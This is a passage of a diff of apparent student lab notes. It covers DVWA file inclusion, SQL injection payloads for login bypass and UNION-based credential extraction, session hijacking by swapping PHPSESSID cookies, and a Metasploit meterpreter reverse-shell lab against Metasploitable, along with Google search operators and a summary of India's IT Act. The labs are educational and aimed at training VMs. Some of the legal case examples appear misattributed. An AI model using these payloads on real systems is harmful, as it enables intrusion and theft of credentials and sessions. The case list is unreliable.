 ```
 
-This includes your login.php file in DVWA.
-
----
-
-# **4. Create Your Own login.php – (For LFI)**
-
-Folder:
+Include remote file (RFI demo):
 
 ```
-C:\xampp\htdocs\sqlinjection
+?page=http://www.google.com
 ```
 
-Files needed:
+### Create basic login files (for testing LFI)
 
-* login.php
-* index.php
-* logout.php
-
+* Place `login.php`, `index.php`, `logout.php` in `C:\xampp\htdocs\sqlinjection`
 ### **login.php**
 
 ```php
@@ -1295,7 +448,7 @@ exit;
 ?>
 ```
 
-### **SQL Table**
+### SQL (sample table + inserts)
 
 ```sql
 CREATE TABLE login_user (
@@ -1304,78 +457,29 @@ CREATE TABLE login_user (
   password VARCHAR(255),
   name VARCHAR(100)
 );
-
 INSERT INTO login_user (user_name, password, name)
 VALUES ('admin', 'admin123', 'Admin User'),
        ('neha', 'neha123', 'Neha Yadav');
 ```
 
----
+### SQL Injection payloads & tests
 
-# **B. Remote File Inclusion (RFI)**
-
-In DVWA File Inclusion page:
-
-```
-?page=http://www.google.com
-```
-
-This demonstrates RFI vulnerability.
-
----
-
-# **C. SQL Injection (XAMPP Site)**
-
-### **Insert Sample Users**
-
-```sql
-INSERT INTO user_login VALUES
-(1,'IT','admin','admin'),
-(2,'Mimi','mimimimi','mimi'),
-(3,'SIES ka hacker','hacker hai bhai','ProHacker'),
-(4,'Raoji','Maldives Queen','Hi@guyz#Iam&UnderWateer-huhuuhu');
-```
-
-### **Perform SQL Injection**
-
-Use payload:
+* Bypass login:
 
 ```
 Username: ' OR 1=1--
 Password: anything
 ```
 
-This bypasses authentication.
-
----
-
-# **Prevent SQL Injection – Prepared Statements**
-
-### **Secure login.php**
-
-```php
-$sql="SELECT * FROM user_login WHERE user_name=? and password=?";
-$stmt =$con->prepare($sql);
-$stmt->bind_param('ss',$uname,$pass);
-$stmt->execute();
-```
-
-Prepared statements stop SQL injection.
-
----
-
-# **D. SQL Injection using DVWA (Low Security)**
-
-Try:
+* Order-by to find column count:
 
 ```
-1
 1' order by 1#
 1' order by 2#
-1' order by 3#   → ERROR → only 2 columns
+1' order by 3#   -- triggers error if only 2 columns
 ```
 
-### **Union-based SQL injection examples**
+* UNION-based data extraction examples:
 
 ```
 1' or '1'='1
@@ -1387,141 +491,196 @@ Try:
 1' UNION select null, concat(id,0x0a,user_name,0x0a,password) from users.user_login#
 ```
 
-Interpretation:
+### Session Hijacking (manual cookie edit)
 
-* Able to extract database user
-* Show version, current DB
-* Dump tables & login credentials
-
----
-
-# **E. Session Hijacking**
-
-### **Tools Needed**
-
-* **Wireshark** → [https://www.wireshark.org/download.html](https://www.wireshark.org/download.html)
-* **EditThisCookie Extension**
-* Browser Developer Tools
-
-### **Steps**
-
-1. Login as Admin → Capture cookie:
-
-```
-PHPSESSID=lsahikkec6nrputs4i16u56933
-```
-
-2. Logout Admin.
-3. Login as Mimi → Capture cookie:
-
-```
-PHPSESSID=fn8nu5p25sgb19rja9421s6cih
-```
-
-4. Open EditThisCookie → Replace Mimi's session ID with Admin session ID.
-5. Refresh → **Logged in as Admin without password**.
+* Tools: Wireshark, EditThisCookie
+* Steps: Capture PHPSESSID for Admin, then replace another user's PHPSESSID with Admin's value using EditThisCookie → refresh → gain access as Admin.
 
 ---
 
-# **F. Prevent Session Hijacking**
 
-* Use **HTTPS**
-* Use **VPN** to encrypt traffic
-* Implement **HTTPOnly cookies**
-* Use **Regenerate Session ID after login**
-* Implement **Short session timeouts**
+1. Basic Google Operators
+cache: – View Google’s Cached Version of a Page
+Usage:
 
----
-
-# 8
-
-
-# 8 – Penetration Testing Using Metasploit & Metasploitable
-
-# **1. Objective**
-
-* Perform safe and ethical penetration testing on **Metasploitable VM**.
-* Use **Metasploit Framework** to discover, exploit, and post‑exploit vulnerabilities.
-* Document findings, risks, and mitigation steps.
-
-Target VM: **Metasploitable2** (default credentials: `msfadmin:msfadmin`).
-Tools: Metasploit, Nmap, Netcat, Nikto, SMB tools, enum4linux.
-Environment must be isolated (Host‑Only or NAT).
-
----
-
-# **2. Rules of Engagement**
-
-* Target only your own lab VMs.
-* No testing on external networks.
-* Follow proper ethical hacking guidelines.
-
----
-
-# **3. Lab Setup**
-
-### **Attacker Machine**
-
-* Kali Linux (Metasploit preinstalled) OR Linux with Metasploit installed.
-
-### **Target**
-
-* Metasploitable2 VM (in VirtualBox or VMware).
-
-Ensure:
-
-* Both VMs are on same internal/host‑only network.
-* Metasploitable IP reachable (e.g., `192.168.56.101`).
-
----
-
-# **4. Penetration Testing Methodology**
-
-## **1️⃣ Reconnaissance (Nmap)**
-
-Discover open ports & OS:
-
-```
-nmap -sS -sV -O -p- -T4 <target_ip>
-```
+cache:<URL>
 
 Example:
 
-```
+cache:irs.gov
+
+(Shows Google’s cached version of the US Internal Revenue Service home page.)
+
+info: (or id:) – Get Info About a Website
+Usage:
+
+info:<URL>
+
+Example:
+
+info:theonion.com
+
+(Displays Google’s summary, similar pages, cached version, etc.)
+
+related: – Find Similar/Related Websites
+Usage:
+
+related:<URL>
+
+Example:
+
+related:healthfinder.gov
+
+(Shows sites related to Healthfinder.)
+
+2. Restrict Search Based on Location of Terms
+Operator	Meaning	Example
+allinanchor:	All query words must appear in anchor text	allinanchor:useful parenting sites
+inanchor:	Terms appear in anchor text	restaurants Portland inanchor:kid-friendly
+allintext:	All query words must appear in body text	allintext:ingredients cilantro chicken lime
+intext:	The term must appear in the text	Dan Shugar intext:Powerlight
+allintitle:	All words appear in the title	allintitle: Google Advanced Operators
+intitle:	Terms must appear in the title	movies comedy intitle:top ten
+allinurl:	All terms must appear in URL	allinurl:pez faq
+inurl:	Terms must appear in the URL	pharmaceutical inurl:investor
+3. Google Groups Search Operators
+Operator	Meaning	Example
+author:	Find messages by an author	flvina author:Hamish author:Reid
+group:	Search inside a specific newsgroup	ivan doig group:rec.arts.books
+insubject:	Terms must appear in subject	insubject:"crazy quilts"
+4. Google News Search Operators
+Operator	Meaning	Example
+location:	News from a specific region	queen location:uk
+source:	Specify news outlet	peace source:ha_aretz
+Laws under IT Act 2000 and IT Amendment Act 2008
+Introduction
+The Information Technology (IT) Act, 2000, provides the legal framework for e-governance, digital communication, and cybercrime regulation in India. It recognizes electronic records and digital signatures as legally valid. The IT (Amendment) Act, 2008, strengthened the original law by including data protection, privacy, and cyber terrorism provisions. Together, they form the foundation of cyber law in India, ensuring responsible use of technology.
+
+Key Sections of the IT Act
+Section 43 - Damage to Computer, Computer System, etc.
+Description: Addresses unauthorized access, data theft, or damage to computer systems and networks.
+Case: Bank of America Data Breach (2011) — sensitive data of nearly 90 million customers was exposed due to a stolen laptop.
+Penalty: Imprisonment up to 3 years and/or fine up to ₹5 lakh.
+Preventive Measures: Encrypt sensitive data, restrict access, implement cybersecurity policies.
+Section 65 - Tampering with Computer Source Documents
+Description: Intentional alteration, destruction, or concealment of computer source code.
+Case: Kevin Mitnick accessed company systems, altered source codes, and stole confidential data.
+Penalty: Imprisonment up to 3 years and/or fine.
+Preventive Measures: Use source control systems, regular audits, strong authentication.
+Section 66A - Sending Offensive Messages (Struck down in 2015)
+Description: Penalized sending offensive or threatening electronic messages.
+Case: Raja Ram Pal (2012) — accused of sending offensive political emails.
+Penalty: Imprisonment up to 3 years and/or fine.
+Preventive Measures: Promote responsible online behaviour.
+Section 66B - Dishonestly Receiving Stolen Computer Resource
+Description: Punishes receiving or using stolen computer resources or data.
+Case: Orkut Data Theft Case (2010) — stolen user data sold online for scams.
+Penalty: Imprisonment up to 3 years and/or fine up to ₹1 lakh.
+Preventive Measures: Verify data sources and ensure secure storage.
+Section 66C - Identity Theft / Cyber Extortion
+Description: Fraudulent use of another person’s digital identity.
+Case: Unocoin Cyber Extortion Case — hackers accessed crypto wallets and demanded ransom.
+Penalty: Imprisonment up to 7 years and fine.
+Preventive Measures: Use two-factor authentication, secure transactions.
+Section 66D - Cheating by Personation Using Computer Resource
+Description: Online impersonation or fraud.
+Case: Krrish 3 Piracy Case — illegal distribution of the movie through fake websites.
+Penalty: Imprisonment up to 7 years and fine.
+Preventive Measures: Digital rights management (DRM) and anti-piracy awareness.
+Section 66E - Violation of Privacy / Video Voyeurism
+Description: Capturing or transmitting private images without consent.
+Case: 2015 trial room recording incident — leaked videos sparked public outrage.
+Penalty: Imprisonment up to 3 years and/or fine up to ₹2 lakh.
+Preventive Measures: Surveillance only in public areas, privacy awareness.
+Section 66F - Cyber Terrorism
+Description: Cyber activities threatening national security.
+Case: Operation Aurora (2009) — hackers targeted Indian and U.S. government systems.
+Penalty: Imprisonment for life.
+Preventive Measures: Strengthen national cybersecurity and intelligence systems.
+Section 67A - Publishing or Transmitting Obscene Material
+Description: Prohibits sexually explicit content online.
+Case: TV channel penalized for airing explicit content.
+Penalty: Imprisonment up to 7 years and fine up to ₹10 lakh.
+Preventive Measures: Content moderation and adherence to cyber ethics.
+Section 67B - Child Pornography / Abetment to Obscene Acts
+Description: Punishes content involving minors.
+Case: Tubemate App Case — app enabled illegal downloading of obscene videos.
+Penalty: Imprisonment up to 7 years and/or fine.
+Preventive Measures: Monitor online content and enforce child protection.
+Section 71 - Misuse of Personal Information
+Description: Misuse of personal data collected for legitimate purposes.
+Case: Aadhaar Data Leak — exposed sensitive citizen information.
+Penalty: Imprisonment up to 7 years and fine.
+Preventive Measures: Strong encryption, limited access, security checks.
+Section 72 - Breach of Confidentiality and Privacy
+Description: Unauthorized disclosure of confidential data.
+Case: Telecom company employees leaked customer details.
+Penalty: Imprisonment up to 7 years and/or fine.
+Preventive Measures: NDAs, monitor employee access.
+Section 73 - Publishing False Digital Signatures
+Description: Creating or using false digital signatures.
+Case: Fake digital certificates used in fraudulent finance transactions.
+Penalty: Imprisonment up to 2 years and/or fine up to ₹1 lakh.
+Preventive Measures: Verify digital signatures and secure private keys.
+Section 74 - Publication for Fraudulent Purpose
+Description: Use of fraudulent digital certificates or documents.
+Case: Corporate fraud involving forged electronic certificates.
+Penalty: Imprisonment up to 7 years and/or fine.
+Preventive Measures: Validate documents and maintain audit trails.
+Conclusion
+Cyber laws regulate online behaviour and protect individuals, organizations, and governments from digital threats. The IT Act 2000 and its 2008 amendment strengthen India’s cyber legal framework. Awareness, compliance, and cybersecurity best practices are essential for a safer digital ecosystem.
+
+8 – Penetration Testing Using Metasploit & Metasploitable
+1. Objective
+Perform safe and ethical penetration testing on Metasploitable VM.
+Use Metasploit Framework to discover, exploit, and post‑exploit vulnerabilities.
+Document findings, risks, and mitigation steps.
+Target VM: Metasploitable2 (default credentials: msfadmin:msfadmin). Tools: Metasploit, Nmap, Netcat, Nikto, SMB tools, enum4linux. Environment must be isolated (Host‑Only or NAT).
+
+2. Rules of Engagement
+Target only your own lab VMs.
+No testing on external networks.
+Follow proper ethical hacking guidelines.
+3. Lab Setup
+Attacker Machine
+Kali Linux (Metasploit preinstalled) OR Linux with Metasploit installed.
+Target
+Metasploitable2 VM (in VirtualBox or VMware).
+Ensure:
+
+Both VMs are on same internal/host‑only network.
+Metasploitable IP reachable (e.g., 192.168.56.101).
+4. Penetration Testing Methodology
+1️⃣ Reconnaissance (Nmap)
+Discover open ports & OS:
+
+nmap -sS -sV -O -p- -T4 <target_ip>
+
+Example:
+
 nmap -sS -sV -O -p- -T4 192.168.56.101
-```
 
-## **2️⃣ Enumeration**
-
+2️⃣ Enumeration
 Use tools to enumerate services:
 
-```
 nikto -h <target_ip>
 smbclient -L //<target_ip>/
 enum4linux <target_ip>
-```
 
-## **3️⃣ Metasploit Module Selection**
-
+3️⃣ Metasploit Module Selection
 Start Metasploit:
 
-```
 sudo msfconsole
-```
 
 Search for exploit modules:
 
-```
 search vsftpd
 search samba
 search tomcat
-```
 
-## **4️⃣ Exploitation**
-
+4️⃣ Exploitation
 General MSF exploitation workflow:
 
-```
 use <module>
 show options
 set RHOSTS <target_ip>
@@ -1529,36 +688,26 @@ set RPORT <port>
 set PAYLOAD <payload>
 set LHOST <attacker_ip>
 exploit
-```
 
-## **5️⃣ Post‑Exploitation**
-
+5️⃣ Post‑Exploitation
 Once Meterpreter shell obtained:
 
-```
 getuid
 sysinfo
 ls
 cat /etc/passwd
-```
 
 Privilege escalation if possible.
 
-## **6️⃣ Reporting**
-
+6️⃣ Reporting
 Include:
 
-* Commands used
-* Screenshots
-* Shell outputs
-* Risk level
-* Fix recommendations
-
----
-
-# **5. Example Command Log (Copy‑Paste Ready)**
-
-```
+Commands used
+Screenshots
+Shell outputs
+Risk level
+Fix recommendations
+5. Example Command Log (Copy‑Paste Ready)
 sudo msfconsole
 nmap -sS -sV -O -p- -T4 192.168.56.101
 
@@ -1579,59 +728,38 @@ msf > use exploit/multi/handler
 msf exploit(multi/handler) > set PAYLOAD linux/x86/meterpreter/reverse_tcp
 msf exploit(multi/handler) > set LHOST 192.168.56.1
 msf exploit(multi/handler) > exploit -j
-```
 
----
-
-# **6. Findings (Sample Table)**
-
-| ID | Vulnerability                    | Service | Impact                     | Evidence                     | Severity |
-| -- | -------------------------------- | ------- | -------------------------- | ---------------------------- | -------- |
-| 1  | Default credentials (`msfadmin`) | SSH     | Unauthorized access        | `ssh msfadmin@target`        | Medium   |
-| 2  | vsftpd 2.3.4 Backdoor            | FTP 21  | Remote Command Execution   | Metasploit shell             | **High** |
-| 3  | Outdated Samba                   | SMB     | Info leakage / RCE         | `smbclient -L` + MSF modules | **High** |
-| 4  | Vulnerable web apps              | HTTP    | Directory traversal / SQLi | Nikto results                | Medium   |
-
----
-
-# **7. Risk Ratings & Recommendations**
-
-### **High‑Risk Issues** (RCE, weak creds)
-
-* Patch/update services.
-* Remove default accounts.
-* Disable unneeded services (FTP, Telnet).
-
-### **Medium‑Risk Issues**
-
-* Apply strong authentication.
-* Implement firewall segmentation.
-
-### **General Security Fixes**
-
-* Apply OS + service updates.
-* Enforce password policies.
-* Enable monitoring / IDS.
-
----
-
-# **8. Executive Summary**
-
+6. Findings (Sample Table)
+ID	Vulnerability	Service	Impact	Evidence	Severity
+1	Default credentials (msfadmin)	SSH	Unauthorized access	ssh msfadmin@target	Medium
+2	vsftpd 2.3.4 Backdoor	FTP 21	Remote Command Execution	Metasploit shell	High
+3	Outdated Samba	SMB	Info leakage / RCE	smbclient -L + MSF modules	High
+4	Vulnerable web apps	HTTP	Directory traversal / SQLi	Nikto results	Medium
+7. Risk Ratings & Recommendations
+High‑Risk Issues (RCE, weak creds)
+Patch/update services.
+Remove default accounts.
+Disable unneeded services (FTP, Telnet).
+Medium‑Risk Issues
+Apply strong authentication.
+Implement firewall segmentation.
+General Security Fixes
+Apply OS + service updates.
+Enforce password policies.
+Enable monitoring / IDS.
+8. Executive Summary
 A penetration test was conducted against Metasploitable using Metasploit. Multiple critical vulnerabilities were exploited, including a vsftpd backdoor providing a remote shell. This environment is intentionally vulnerable for training, but the findings reflect real‑world security failures such as outdated services, weak credentials, and misconfiguration.
 
----
-
-# **9. Appendix – Evidence Collection**
-
+9. Appendix – Evidence Collection
 Include in your final submission:
 
-* Nmap scan results
-* Metasploit console logs
-* Screenshots of:
+Nmap scan results
 
-  * Successful exploits
-  * Meterpreter session
-  * Privilege escalation
-  * File extraction (e.g., `/etc/passwd`)
+Metasploit console logs
 
----
+Screenshots of:
+
+Successful exploits
+Meterpreter session
+Privilege escalation
+File extraction (e.g., /etc/passwd)
